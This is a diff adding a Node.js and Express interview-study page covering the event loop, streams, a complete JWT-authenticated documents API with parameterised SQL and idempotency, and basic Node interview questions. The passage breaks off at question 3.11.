@@ -1,0 +1,1005 @@
+<x-obj><ul><li>Explain how Node handles thousands of connections on one thread, and what streams and buffers are for.</li><li>Trace an Express request through middleware, validation, auth, service, repository and the error handler.</li><li>Build a small but complete Express API: validation, JWT auth, ownership checks, pagination, rate limiting, idempotency and central error handling.</li><li>Answer security questions (JWT, bcrypt, SQL injection, XSS, CSRF, CORS) precisely.</li></ul></x-obj>
+<x-pre><ul><li>Phase 2: promises, async/await and the event loop.</li><li>Basic HTTP: methods, headers, status codes, JSON.</li></ul></x-pre>
+
+<h2 class="sec"><span class="k">3.A</span>Node.js under the hood</h2>
+
+<x-lesson t="Node.js architecture: V8, libuv and non-blocking I/O" tag="must">
+<x-def>Node.js is a runtime that runs JavaScript outside the browser. It combines the V8 engine (compiles and runs JS) with libuv (event loop, async I/O, thread pool) and a standard library (http, fs, crypto, streams).</x-def>
+<x-why>Classic servers used one thread per connection. Threads cost memory and context switches, and most of their time is spent waiting on I/O. Node’s bet: one thread runs your code, the OS waits on sockets for you, and callbacks fire when data is ready. That makes I/O-heavy servers (APIs, chat, proxies, LLM gateways that mostly wait) cheap to run.</x-why>
+<x-in><ol><li>Your code calls <code>db.query()</code>. Node sends bytes on a socket and registers interest in the reply with the OS (epoll/kqueue/IOCP). It returns immediately with a pending promise.</li><li>The thread runs other callbacks (other requests).</li><li>The reply arrives; in the poll phase libuv sees the socket is readable and queues the callback; the promise resolves; your <code>await</code> continues as a microtask.</li><li>File system calls, DNS lookups, crypto (pbkdf2, scrypt) and zlib run on libuv’s thread pool (default 4 threads) because many OSes don’t offer good async file APIs.</li></ol></x-in>
+<x-vis><x-w w="flow" f="queue"></x-w></x-vis>
+<x-an>A restaurant with one very fast waiter and a kitchen full of cooks. The waiter never stands at the stove; they take orders and deliver plates when the bell rings.</x-an>
+<x-real>An LLM chat endpoint spends ~99% of its time waiting for the provider. One Node process can hold hundreds of such requests open, as long as none of them does heavy CPU work on the main thread.</x-real>
+<x-mist><ul><li>“Node is single-threaded.” JS execution is; the process isn’t.</li><li>Using sync APIs (<code>fs.readFileSync</code>, <code>bcrypt.hashSync</code>) inside request handlers.</li></ul></x-mist>
+</x-lesson>
+
+<x-lesson t="Streams and buffers" tag="must">
+<x-def>A <b>Buffer</b> is a fixed-size chunk of raw bytes. A <b>stream</b> is data that arrives or leaves piece by piece, so you can process it without holding all of it in memory.</x-def>
+<x-why>Reading a 2 GB file with <code>readFile</code> needs 2 GB of RAM (Render free has 512 MB). A stream reads ~64 KB at a time. Streams also let you start sending a response before it’s finished, which is exactly how LLM token streaming works.</x-why>
+<x-in><ul><li><b>Readable</b> (fs.createReadStream, an HTTP request body), <b>Writable</b> (fs.createWriteStream, an HTTP response), <b>Duplex</b> (both, e.g. a TCP socket), <b>Transform</b> (a duplex that changes data, e.g. gzip).</li><li><b>Backpressure:</b> when the writer is slower than the reader, <code>write()</code> returns false; a correct pipeline pauses reading until the <code>drain</code> event. <code>stream.pipeline()</code> does this and handles errors and cleanup.</li></ul>
+<pre data-l="js">import { createReadStream, createWriteStream } from 'node:fs';
+import { createGzip } from 'node:zlib';
+import { pipeline } from 'node:stream/promises';
+import readline from 'node:readline';
+
+// compress a huge file with constant memory
+await pipeline(createReadStream('big.log'), createGzip(), createWriteStream('big.log.gz'));
+
+// count lines of a 5 GB CSV without loading it
+let n = 0;
+const rl = readline.createInterface({ input: createReadStream('huge.csv'), crlfDelay: Infinity });
+for await (const line of rl) n++;</pre></x-in>
+<x-real>Uploads: stream the multipart body straight to object storage instead of buffering it. LLM responses: read <code>res.body</code> chunk by chunk with <code>getReader()</code> and forward each piece to the client as an SSE event.</x-real>
+<x-dm><p>DocMind uses multer’s <b>memory storage</b> (the whole PDF in RAM) with a 10 MB cap, because pdf-parse needs the full bytes. Streaming to disk/storage would be the next step for big files. Gemini’s stream is read with <code>getReader()</code> + <code>TextDecoder</code>, normalising <code>\r\n</code> to <code>\n</code> on the whole buffer (a <code>\r\n</code> split across two reads was a real bug).</p></x-dm>
+<x-mist><ul><li><code>a.pipe(b)</code> without error handling: an error on one side leaks the other. Use <code>pipeline</code>.</li><li>Decoding each chunk separately with <code>chunk.toString()</code>: a multi-byte UTF-8 character split across chunks becomes garbage. Use <code>TextDecoder</code> with <code>{ stream: true }</code> or <code>setEncoding('utf8')</code>.</li></ul></x-mist>
+</x-lesson>
+
+<h2 class="sec"><span class="k">3.B</span>Express and the mini application</h2>
+
+<x-lesson t="The Express request-response lifecycle" tag="must">
+<x-def>Express is a thin layer over Node’s http module: it gives you routing and a middleware pipeline. Every request walks through middleware functions in registration order until one sends a response.</x-def>
+<x-in><p>A middleware is <code>(req, res, next) => {}</code>. It can read/modify <code>req</code> and <code>res</code>, end the request (<code>res.json()</code>), call <code>next()</code> to continue, or call <code>next(err)</code> to jump to error handlers. Error handlers have four parameters <code>(err, req, res, next)</code>. In Express 5, a rejected promise from an async handler is forwarded to <code>next(err)</code> automatically.</p></x-in>
+<x-vis><x-w w="flow" f="http"></x-w></x-vis>
+<x-an>An airport: check-in (parse), security (auth), passport control (validation), gate (handler). Fail at security and you never reach the gate; you’re sent to the help desk (error handler).</x-an>
+<x-mist><ul><li>Registering <code>express.json()</code> after the routes that need it: <code>req.body</code> is undefined.</li><li>Calling <code>next()</code> after sending a response: “Cannot set headers after they are sent”.</li><li>Putting <code>requireAuth</code> before <code>cors()</code>: the browser’s preflight has no token and fails.</li></ul></x-mist>
+</x-lesson>
+
+<x-lesson t="Build it: a complete mini Express API" tag="must">
+<x-def>A small documents API that shows every pattern interviewers ask about, in one file you can run. Node 20+, ES modules, Express 5, Zod 4, pg, jsonwebtoken, bcrypt.</x-def>
+<x-impl><pre data-l="bash">npm i express@5 cors helmet express-rate-limit jsonwebtoken bcrypt pg zod
+# package.json: "type": "module"   ·   env: DATABASE_URL, JWT_SECRET, FRONTEND_URL</pre>
+<pre data-l="sql">CREATE TABLE users (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), email text UNIQUE NOT NULL,
+  password_hash text NOT NULL, created_at timestamptz NOT NULL DEFAULT now());
+CREATE TABLE documents (id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+  user_id uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE, title text NOT NULL,
+  created_at timestamptz NOT NULL DEFAULT now());
+CREATE INDEX documents_user_created_idx ON documents (user_id, created_at DESC, id DESC);
+CREATE TABLE idempotency_keys (user_id uuid NOT NULL, key text NOT NULL, response jsonb,
+  created_at timestamptz NOT NULL DEFAULT now(), PRIMARY KEY (user_id, key));</pre>
+<pre data-l="js">// server.js
+import express from 'express';
+import cors from 'cors';
+import helmet from 'helmet';
+import rateLimit from 'express-rate-limit';
+import jwt from 'jsonwebtoken';
+import bcrypt from 'bcrypt';
+import pg from 'pg';
+import { z } from 'zod';
+
+const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL, max: 10 });
+const JWT_SECRET = process.env.JWT_SECRET;
+if (!JWT_SECRET) throw new Error('JWT_SECRET is required');   // fail fast at boot
+
+// ---------- errors ----------
+class HttpError extends Error {
+  constructor(status, message, details) { super(message); this.status = status; this.details = details; }
+}
+
+// ---------- middleware ----------
+const validate = (schema, where = 'body') => (req, res, next) => {
+  const r = schema.safeParse(req[where]);
+  if (!r.success) return next(new HttpError(400, 'Invalid request', z.flattenError(r.error)));
+  req.valid = { ...req.valid, [where]: r.data };   // Express 5: req.query is read-only, keep parsed data here
+  next();
+};
+
+function requireAuth(req, res, next) {
+  const [scheme, token] = (req.get('authorization') ?? '').split(' ');
+  if (scheme !== 'Bearer' || !token) return next(new HttpError(401, 'Sign in required'));
+  try {
+    const payload = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }); // verify, never decode
+    req.user = { id: payload.sub };
+    next();
+  } catch {
+    next(new HttpError(401, 'Sign in required'));
+  }
+}
+
+const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, limit: 20, standardHeaders: 'draft-8', legacyHeaders: false });
+
+// ---------- schemas ----------
+const Credentials = z.object({ email: z.string().trim().toLowerCase().pipe(z.email()), password: z.string().min(8).max(72) });
+const NewDocument = z.strictObject({ title: z.string().trim().min(1).max(200) });
+const ListQuery = z.object({ limit: z.coerce.number().int().min(1).max(50).default(20), cursor: z.string().optional() });
+const IdParam = z.object({ id: z.uuid() });
+
+// ---------- repositories: the only place with SQL ----------
+const repo = {
+  async createUser(email, hash) {
+    const { rows } = await pool.query('INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id, email', [email, hash]);
+    return rows[0];
+  },
+  async findUserByEmail(email) {
+    const { rows } = await pool.query('SELECT id, email, password_hash FROM users WHERE email = $1', [email]);
+    return rows[0] ?? null;
+  },
+  async listDocuments(userId, limit, cursor) {
+    // keyset pagination: stable and fast, unlike OFFSET on big tables
+    const params = [userId, limit + 1];
+    let where = 'user_id = $1';
+    if (cursor) {
+      const [ts, id] = Buffer.from(cursor, 'base64url').toString().split('|');
+      params.push(ts, id);
+      where += ' AND (created_at, id) &lt; ($3::timestamptz, $4::uuid)';
+    }
+    const { rows } = await pool.query(
+      `SELECT id, title, created_at FROM documents WHERE ${where} ORDER BY created_at DESC, id DESC LIMIT $2`, params);
+    const hasMore = rows.length > limit;
+    const page = rows.slice(0, limit);
+    const last = page.at(-1);
+    return { items: page, nextCursor: hasMore ? Buffer.from(`${last.created_at.toISOString()}|${last.id}`).toString('base64url') : null };
+  },
+  async getDocument(userId, id) {   // ownership is part of the query
+    const { rows } = await pool.query('SELECT id, title, created_at FROM documents WHERE id = $1 AND user_id = $2', [id, userId]);
+    return rows[0] ?? null;
+  },
+  async createDocumentIdempotent(userId, key, title) {
+    const client = await pool.connect();
+    try {
+      await client.query('BEGIN');
+      // claim the key; a concurrent duplicate waits on the PK lock, then sees the conflict
+      const claim = await client.query(
+        'INSERT INTO idempotency_keys (user_id, key) VALUES ($1, $2) ON CONFLICT DO NOTHING RETURNING key', [userId, key]);
+      if (claim.rowCount === 0) {
+        await client.query('ROLLBACK');
+        const { rows } = await pool.query('SELECT response FROM idempotency_keys WHERE user_id = $1 AND key = $2', [userId, key]);
+        return { replay: true, doc: rows[0]?.response };
+      }
+      const { rows } = await client.query(
+        'INSERT INTO documents (user_id, title) VALUES ($1, $2) RETURNING id, title, created_at', [userId, title]);
+      await client.query('UPDATE idempotency_keys SET response = $3 WHERE user_id = $1 AND key = $2', [userId, key, rows[0]]);
+      await client.query('COMMIT');
+      return { replay: false, doc: rows[0] };
+    } catch (err) {
+      await client.query('ROLLBACK');
+      throw err;
+    } finally {
+      client.release();            // ALWAYS give the connection back to the pool
+    }
+  },
+};
+
+// ---------- app ----------
+const app = express();
+app.set('trust proxy', 1);                       // behind one proxy; measure this on your host
+app.use(helmet());
+app.use(cors({ origin: process.env.FRONTEND_URL })); // before auth: preflights carry no token
+app.use(express.json({ limit: '100kb' }));
+
+app.get('/health', (req, res) => res.json({ ok: true }));
+
+app.post('/auth/register', authLimiter, validate(Credentials), async (req, res) => {
+  const { email, password } = req.valid.body;
+  const hash = await bcrypt.hash(password, 10);  // async: runs on the libuv pool
+  try {
+    const user = await repo.createUser(email, hash);
+    res.status(201).json({ token: jwt.sign({}, JWT_SECRET, { subject: user.id, expiresIn: '15m' }) });
+  } catch (err) {
+    if (err.code === '23505') throw new HttpError(409, 'Email already registered'); // unique violation
+    throw err;
+  }
+});
+
+app.post('/auth/login', authLimiter, validate(Credentials), async (req, res) => {
+  const { email, password } = req.valid.body;
+  const user = await repo.findUserByEmail(email);
+  const ok = user ? await bcrypt.compare(password, user.password_hash) : false;
+  if (!ok) throw new HttpError(401, 'Invalid email or password');   // same message for both cases
+  res.json({ token: jwt.sign({}, JWT_SECRET, { subject: user.id, expiresIn: '15m' }) });
+});
+
+app.use(requireAuth);                            // everything below needs a valid token
+
+app.get('/documents', validate(ListQuery, 'query'), async (req, res) => {
+  const { limit, cursor } = req.valid.query;
+  res.json(await repo.listDocuments(req.user.id, limit, cursor));
+});
+
+app.get('/documents/:id', validate(IdParam, 'params'), async (req, res) => {
+  const doc = await repo.getDocument(req.user.id, req.valid.params.id);
+  if (!doc) throw new HttpError(404, 'Document not found');    // not yours = doesn't exist
+  res.json(doc);
+});
+
+app.post('/documents', validate(NewDocument), async (req, res) => {
+  const key = req.get('idempotency-key');
+  if (!key) throw new HttpError(400, 'Idempotency-Key header required');
+  const { replay, doc } = await repo.createDocumentIdempotent(req.user.id, key, req.valid.body.title);
+  res.status(replay ? 200 : 201).json(doc);
+});
+
+// ---------- 404 + central error handler (4 params!) ----------
+app.use((req, res) => res.status(404).json({ error: 'Not found' }));
+app.use((err, req, res, next) => {
+  const status = err.status ?? (err.type === 'entity.parse.failed' ? 400 : 500);
+  if (status >= 500) console.error({ msg: err.message, stack: err.stack, path: req.path });
+  res.status(status).json({ error: status >= 500 ? 'Internal server error' : err.message, details: err.details });
+});
+
+const server = app.listen(process.env.PORT ?? 3000);
+process.on('SIGTERM', () => server.close(() => pool.end()));   // graceful shutdown on deploys</pre></x-impl>
+<x-walk><ol><li><code>POST /auth/login</code> → helmet sets security headers → cors → json parser → rate limiter (20 per 15 min per IP) → Zod validates and lowercases the email → bcrypt compare (async) → JWT with <code>sub</code> = user id, 15 min expiry.</li><li><code>GET /documents/abc</code> → requireAuth verifies the token → IdParam rejects “abc” (not a UUID) with 400 before touching the DB.</li><li><code>GET /documents/&lt;someone else's id&gt;</code> → the SQL has <code>AND user_id = $2</code> → no row → 404.</li><li><code>POST /documents</code> twice with the same Idempotency-Key → the second request hits <code>ON CONFLICT DO NOTHING</code>, returns the stored response with 200, no duplicate row.</li><li>Any thrown error inside an async route → Express 5 passes it to the error handler → clean JSON; 5xx details only in logs.</li></ol></x-walk>
+<x-mist><ul><li>Forgetting <code>client.release()</code> in <code>finally</code>: after 10 leaks the pool is empty and every request hangs (Phase 12, scenario 2).</li><li>Building SQL with template strings from user input. Above, only the fixed <code>where</code> fragment is interpolated; all values are <code>$n</code> parameters.</li><li>Returning 403 for another user’s document: it confirms the id exists.</li></ul></x-mist>
+</x-lesson>
+
+<x-lesson t="Authentication: JWT, refresh tokens and password hashing" tag="must">
+<x-def><b>Authentication</b> proves who you are. A <b>JWT</b> is a signed token carrying claims (like the user id) that the server can verify without a database lookup. <b>bcrypt</b> is a slow, salted password hash.</x-def>
+<x-why>HTTP is stateless: every request must prove identity again. Sending the password every time is dangerous; a short-lived signed token is safer. Passwords must be hashed so a stolen database doesn’t reveal them.</x-why>
+<x-in><p>A JWT is <code>base64url(header).base64url(payload).base64url(signature)</code>. With HS256, signature = HMAC-SHA256(header.payload, secret). Anyone can read the payload; only the secret holder can produce a valid signature.</p></x-in>
+<x-vis><x-w w="jwt"></x-w><x-w w="flow" f="auth"></x-w></x-vis>
+<x-impl><p><b>Access + refresh token pattern:</b></p><ul><li>Access token: short-lived (5–15 min), sent as <code>Authorization: Bearer</code>.</li><li>Refresh token: long-lived (days), random opaque string stored <b>hashed</b> in a <code>refresh_tokens</code> table, sent in an <code>httpOnly; Secure; SameSite=Strict</code> cookie to one path (<code>/auth/refresh</code>).</li><li>On refresh: look it up, check not revoked/expired, <b>rotate</b> (delete old, issue new), return a new access token. If a revoked token is used again, treat it as theft and revoke the whole family.</li><li>Logout = delete the refresh token row. Access tokens die on their own within minutes.</li></ul>
+<pre data-l="js">import crypto from 'node:crypto';
+const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
+
+app.post('/auth/refresh', async (req, res) => {
+  const raw = req.cookies?.rt;                      // needs cookie-parser
+  if (!raw) throw new HttpError(401, 'No session');
+  const { rows } = await pool.query(
+    'DELETE FROM refresh_tokens WHERE token_hash = $1 AND expires_at > now() RETURNING user_id', [sha256(raw)]);
+  if (!rows[0]) throw new HttpError(401, 'Session expired');   // deleted = used once (rotation)
+  const next = crypto.randomBytes(32).toString('base64url');
+  await pool.query("INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, now() + interval '7 days')",
+    [rows[0].user_id, sha256(next)]);
+  res.cookie('rt', next, { httpOnly: true, secure: true, sameSite: 'strict', path: '/auth/refresh', maxAge: 7 * 864e5 });
+  res.json({ token: jwt.sign({}, JWT_SECRET, { subject: rows[0].user_id, expiresIn: '15m' }) });
+});</pre></x-impl>
+<x-dm><p>DocMind uses <b>only</b> access tokens: 7 days for registered users, 30 days for guests (an expired guest token means lost files), HS256 with the algorithm pinned, Bearer header in <code>localStorage</code> (Vercel and Render are different sites, so an API cookie would be third-party). No refresh tokens or server-side logout yet: listed as a known gap. That’s why answers are rendered with react-markdown and no raw HTML: a token in localStorage is readable by any XSS.</p></x-dm>
+<x-mist><ul><li>Using <code>jwt.decode()</code> to “check” a token. It doesn’t verify anything.</li><li>Not pinning <code>algorithms</code> (historic “alg: none” and RS/HS confusion attacks).</li><li>Putting roles in a long-lived token and expecting role changes to apply immediately.</li></ul></x-mist>
+</x-lesson>
+
+<x-lesson t="Reliability patterns: background jobs, retries, idempotency, webhooks" tag="must">
+<x-def><b>Idempotent</b> means doing it twice has the same effect as doing it once. <b>Retries</b> repeat failed calls. <b>Background jobs</b> move slow work out of the request. <b>Webhooks</b> are HTTP callbacks another system sends you when something happens.</x-def>
+<x-why>Networks fail in the middle. A client that times out doesn’t know whether the server finished, so it retries. Without idempotency, retries create duplicate payments, duplicate documents, duplicate courses.</x-why>
+<x-in><ul><li><b>Retry only what is safe and transient:</b> timeouts, 429, 5xx. Never 400/401/403/404/422.</li><li><b>Exponential backoff with jitter:</b> wait base × 2^attempt, randomised, capped; respect <code>Retry-After</code>.</li><li><b>Idempotency keys:</b> the client sends a unique key per logical operation; the server stores the result under (user, key) with a unique constraint and replays it for duplicates.</li><li><b>Idempotent jobs:</b> design the job so re-running it is harmless (upsert, delete-then-insert, “if already done, skip”).</li><li><b>Webhooks:</b> verify the signature (HMAC over the raw body with a shared secret), respond 2xx fast, enqueue the work, dedupe by event id because senders retry.</li></ul></x-in>
+<x-vis><x-w w="retry"></x-w></x-vis>
+<x-dm><p>DocMind’s ingest job uses <code>jobId = documentId</code> (BullMQ won’t add the same id twice), 3 attempts with 5 s then 10 s backoff, and is idempotent: it deletes the document’s chunks first, then inserts all of them. Tested with a forced failure on chunk 2 and with a hard kill mid-job. “Last attempt?” is checked with <code>await job.getState() === 'failed'</code>, because a stalled job can be failed before its attempts run out.</p></x-dm>
+<x-mist><ul><li>Retrying inside a retry inside a retry (3 layers × 3 attempts = 27 calls).</li><li>Checking “does it exist?” then inserting: two concurrent requests both see “no”. Let a unique constraint decide.</li></ul></x-mist>
+</x-lesson>
+
+<h2 class="sec"><span class="k">3.1</span>Node.js</h2>
+
+<x-q n="3.1" tag="must basic"><x-t>What is Node.js?</x-t>
+<x-say>A JavaScript runtime built on Chrome’s V8 engine and libuv. It runs JS on servers with an event-driven, non-blocking I/O model, plus a standard library for HTTP, files, crypto and streams.</x-say>
+<x-simple>A runtime is the environment that executes code and provides APIs. Node takes V8 (Chrome’s JS engine: parses, compiles with JIT, garbage-collects) and adds what servers need: libuv for the event loop and async I/O, C++ bindings for networking, files, crypto and compression, and a module system. Your code calls <code>fs</code> or <code>http</code>; those call into C++; slow work is handed to the OS or libuv’s thread pool; results come back as callbacks.</x-simple>
+<x-eg>Running <code>node server.js</code> starts one process: V8 runs the file, <code>app.listen</code> asks libuv to watch a socket, and the process stays alive because that handle is open.</x-eg>
+
+<x-fu q="What is V8’s JIT?">V8 first interprets bytecode (Ignition), watches which functions are hot and what types they see, then compiles those to optimised machine code (TurboFan); if assumptions break (types change), it deoptimises.</x-fu>
+<x-no>“Node is a framework” or “a language”. It’s a runtime; Express is the framework.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.2" tag="must basic"><x-t>Why is Node.js suitable for backend development?</x-t>
+<x-say>It handles many concurrent I/O-bound connections efficiently on one thread, shares a language and JSON with the frontend, has a huge package ecosystem, and is natural for streaming (SSE, WebSockets).</x-say>
+<x-simple>Most backend time is waiting: on databases, other APIs, LLM providers. Node’s non-blocking model holds thousands of waiting requests with little memory, while thread-per-request servers spend memory and context switches on idle threads. Other reasons: one language across frontend and backend (shared types and validation like Zod), JSON-native, a huge npm ecosystem, good streaming primitives (SSE, WebSockets), fast startup for serverless.</x-simple>
+<x-eg>An LLM gateway that forwards requests and streams tokens back is the ideal Node workload: almost no CPU per request, lots of waiting, long-lived streaming responses.</x-eg>
+<x-fu q="When is it a poor fit?">CPU-heavy work (video encoding, ML inference, big number crunching) unless offloaded to workers or other services.</x-fu>
+
+<x-no>“Node is faster than Java/Go.” It isn’t generally faster; it’s efficient for I/O-bound concurrency.</x-no>
+<x-ev>Trade-off awareness.</x-ev></x-q>
+
+<x-q n="3.3" tag="must basic"><x-t>What is non-blocking I/O?</x-t>
+<x-say>Starting an I/O operation and continuing with other work instead of waiting. The result is delivered later through a callback or promise, so one thread can serve many requests that are all waiting on I/O.</x-say>
+<x-simple>Blocking I/O makes the calling thread sleep until data arrives. Non-blocking I/O asks the OS to start the operation and returns immediately; the OS notifies the program when data is ready (readiness via epoll/kqueue, or completion via IOCP). libuv collects these notifications in the poll phase and runs your callbacks. Because the thread never sleeps on one socket, it can serve many.</x-simple>
+<x-eg>While request A waits 3 s for an LLM, requests B to Z are parsed, queried and answered.</x-eg>
+
+<x-fu q="Is file I/O truly non-blocking in Node?">From your code’s view yes, but internally it runs on libuv’s thread pool because portable async file APIs are limited; network I/O uses the OS’s async mechanisms directly.</x-fu>
+<x-ev>Core concept.</x-ev></x-q>
+
+<x-q n="3.4" tag="must basic"><x-t>What is the difference between Node.js and browser JavaScript?</x-t>
+<x-say>Same language and engine family, different environments. The browser has the DOM, window, fetch, localStorage and a security sandbox. Node has fs, process, Buffer, http, child processes, require/ESM loading from disk, and no DOM.</x-say>
+<x-simple><p>Event loops also differ: Node has libuv phases, process.nextTick and setImmediate. Modern Node also has fetch, Web Streams, AbortController and Web Crypto built in.</p></x-simple>
+<x-eg><code>window</code>, <code>document</code>, <code>localStorage</code> exist only in browsers; <code>process.env</code>, <code>fs</code>, <code>Buffer</code>, <code>__dirname</code> (CommonJS) only in Node. That’s why server-only code (API keys) can’t be imported into frontend bundles safely.</x-eg>
+
+<x-fu q="What security difference matters most?">Browser code runs on the user’s machine and is fully visible and modifiable; Node code runs on your server and can hold secrets and talk to private databases.</x-fu>
+<x-no>“Node uses a different JavaScript language.”</x-no>
+<x-ev>Environment awareness.</x-ev></x-q>
+
+<x-q n="3.5" tag="must basic"><x-t>What are Node.js streams?</x-t>
+<x-say>Objects that read or write data in chunks over time instead of all at once, which keeps memory constant and lets processing start immediately. They handle backpressure so a fast producer doesn’t flood a slow consumer.</x-say>
+<x-simple>A stream emits data in chunks (Buffers or strings, or objects in object mode). Readable streams have two modes: flowing (data events) and paused (read() / async iteration). Writable streams accept chunks via write() and signal backpressure by returning false when their internal buffer passes <code>highWaterMark</code>. Pipes connect them and handle pausing/resuming automatically. Modern code uses <code>for await (const chunk of readable)</code> and <code>stream/promises.pipeline</code>.</x-simple>
+<x-eg>Streaming an S3 download to the HTTP response; parsing a large CSV line by line; forwarding LLM tokens as SSE.</x-eg>
+
+<x-fu q="What is backpressure in one sentence?">The consumer telling the producer to slow down so data doesn’t pile up in memory.</x-fu>
+<x-no>“Streams are only for files.” Sockets, HTTP requests/responses, zlib, crypto and process.stdout are all streams.</x-no>
+<x-ev>Memory-aware design.</x-ev></x-q>
+
+<x-q n="3.6" tag="must basic"><x-t>What are readable, writable and duplex streams?</x-t>
+<x-say>Readable produces data (file read, request body). Writable consumes it (file write, response). Duplex does both independently (TCP socket). A Transform is a duplex whose output is computed from its input (gzip, CSV parser).</x-say>
+<x-simple>Readable: a source you read from (fs.createReadStream, an incoming HTTP request, process.stdin). Writable: a destination (fs.createWriteStream, an HTTP response, process.stdout). Duplex: two independent channels in one object, like a TCP socket where reading and writing are unrelated. Transform: a duplex where the output is derived from the input (zlib.createGzip, a CSV parser). You can implement your own by extending the classes or with <code>new Transform({ transform(chunk, enc, cb) {...} })</code>.</x-simple>
+<x-eg>Upload pipeline: request (readable) → a transform that computes SHA-256 as bytes pass → S3 upload stream (writable).</x-eg>
+<x-code><pre data-l="js">import { Transform } from 'node:stream';
+import { pipeline } from 'node:stream/promises';
+const upper = new Transform({
+  transform(chunk, _enc, callback) { callback(null, chunk.toString().toUpperCase()); },
+});
+await pipeline(process.stdin, upper, process.stdout);   // echo input in capitals</pre></x-code>
+
+<x-fu q="Why use pipeline instead of .pipe()?">pipeline forwards errors from any stage, destroys all streams on failure (no leaked file descriptors), and returns a promise.</x-fu>
+<x-no>Mixing up Duplex and Transform.</x-no>
+<x-ev>Vocabulary.</x-ev></x-q>
+
+<x-q n="3.7" tag="should basic"><x-t>What is the EventEmitter class?</x-t>
+<x-say>Node’s publish/subscribe building block: an object you can <code>emit('event', data)</code> on, with listeners registered via <code>on</code>/<code>once</code>. Streams, HTTP servers and sockets are all EventEmitters.</x-say>
+<x-simple>EventEmitter keeps a map from event names to listener arrays. <code>emit(name, ...args)</code> calls each listener synchronously in registration order and returns whether there were listeners. <code>once</code> removes itself after firing; <code>off</code> removes. Default max listeners is 10 per event (a warning hints at a leak). Many Node objects inherit from it, which is why you see <code>.on('error')</code>, <code>.on('data')</code>, <code>.on('close')</code> everywhere.</x-simple>
+<x-code><pre data-l="js">import { EventEmitter } from 'node:events';
+const jobs = new EventEmitter();
+jobs.on('done', ({ id }) => console.log('job done', id));
+jobs.emit('done', { id: 7 });   // listeners run synchronously, in order</pre></x-code>
+<x-fu q="What happens if you emit 'error' with no listener?">Node throws it, crashing the process if nothing catches it. Always listen for 'error' on streams and emitters.</x-fu>
+
+<x-fu q="Is emit asynchronous?">No, listeners run synchronously inside emit. Use setImmediate/queueMicrotask in the listener if you need to defer.</x-fu>
+<x-no>“Listeners run in parallel.”</x-no>
+<x-ev>Node fundamentals.</x-ev></x-q>
+
+<x-q n="3.8" tag="must basic"><x-t>What is the difference between CommonJS and ES Modules?</x-t>
+<x-say>CommonJS uses <code>require</code>/<code>module.exports</code>, loads synchronously and is Node’s original format. ES Modules use <code>import</code>/<code>export</code>, are the JS standard, are loaded asynchronously, allow top-level await and static analysis (tree-shaking).</x-say>
+<x-simple><p>ESM is enabled by <code>"type": "module"</code> or the <code>.mjs</code> extension. In ESM there’s no <code>__dirname</code> (use <code>import.meta.dirname</code> in recent Node or <code>import.meta.url</code>). Recent Node versions can <code>require()</code> synchronous ES modules too.</p></x-simple>
+<x-eg>CommonJS: <code>const express = require('express'); module.exports = app;</code>. ESM: <code>import express from 'express'; export default app;</code>. An ESM package can’t be <code>require</code>d by older Node versions, which is why libraries ship dual builds.</x-eg>
+<x-dm>DocMind’s backend is CommonJS (<code>"type": "commonjs"</code>) compiled from TypeScript. Checking that Mastra ships a CJS build was one of the first checks in the Phase 8 plan.</x-dm>
+
+<x-fu q="Why does ESM allow top-level await but CJS doesn’t?">ESM loading is asynchronous by design (link, then evaluate), so a module can wait; require() is synchronous and must return the exports immediately.</x-fu>
+<x-no>“ESM is just new syntax for require.” Loading semantics, live bindings and resolution rules differ.</x-no>
+<x-ev>Practical module knowledge.</x-ev></x-q>
+
+<x-q n="3.9" tag="must basic"><x-t>How does Node.js handle environment variables?</x-t>
+<x-say>Through <code>process.env</code>, a string-to-string map from the OS environment. Locally they often come from a .env file (dotenv, or <code>node --env-file=.env</code>); in production the platform sets them.</x-say>
+<x-simple>The OS passes key/value strings to every process. Node exposes them as <code>process.env</code> (all values are strings or undefined). In development a .env file is loaded by dotenv or <code>node --env-file=.env</code>; in production the platform injects them (Render dashboard, Kubernetes secrets). Rules: never commit .env, validate and convert at startup, give each environment its own secrets, and don’t log the env object.</x-simple>
+<x-code><pre data-l="js">const Env = z.object({ DATABASE_URL: z.url(), JWT_SECRET: z.string().min(32), PORT: z.coerce.number().default(3000) });
+export const env = Env.parse(process.env);   // crash at boot, not at the first request</pre></x-code>
+<x-dm>DocMind refuses to start without JWT_SECRET, REDIS_URL and BULLMQ_PREFIX. A wrong BULLMQ_PREFIX on Render (copied from .env) once made production share the laptop’s queue.</x-dm>
+
+<x-fu q="Why validate at startup instead of when used?">A missing secret should stop the deploy immediately with a clear message, not crash the first user request hours later.</x-fu>
+<x-no>Treating <code>process.env.PORT</code> as a number without converting it.</x-no>
+<x-ev>Configuration hygiene.</x-ev></x-q>
+
+<x-q n="3.10" tag="must basic"><x-t>What is the purpose of package.json?</x-t>
+<x-say>The project manifest: name, version, module type, scripts, dependencies with version ranges, engines (Node version) and entry points.</x-say>
+<x-simple>package.json describes the project to npm and Node: <code>name</code>/<code>version</code>; <code>type</code> (commonjs or module) which changes how .js files load; <code>main</code>/<code>exports</code> entry points; <code>scripts</code> (npm run dev/build/test); <code>dependencies</code> and <code>devDependencies</code> with semver ranges (<code>^5.1.0</code> = compatible minor/patch updates); <code>engines</code> to declare the Node version.</x-simple>
+<x-eg>DocMind’s package.json pins <code>engines: 22.x</code> so Render uses Node 22, and its scripts include <code>build</code> (tsc) and <code>start</code> (node dist/index.js).</x-eg>
+<x-dm>It must be strict JSON: a <code>//</code> comment added in DocMind’s package.json broke every npm command (EJSONPARSE).</x-dm>
+
+<x-fu q="What does ^ mean in a version range?">Allow updates that don’t change the left-most non-zero number: ^5.1.0 allows 5.x.y ≥ 5.1.0 but not 6.0.0.</x-fu>
+<x-no>“package.json locks exact versions.” That’s the lockfile’s job.</x-no>
+<x-ev>Tooling basics.</x-ev></x-q>
+
+<x-q n="3.11" tag="must basic"><x-t>What is the difference between dependencies and devDependencies?</x-t>
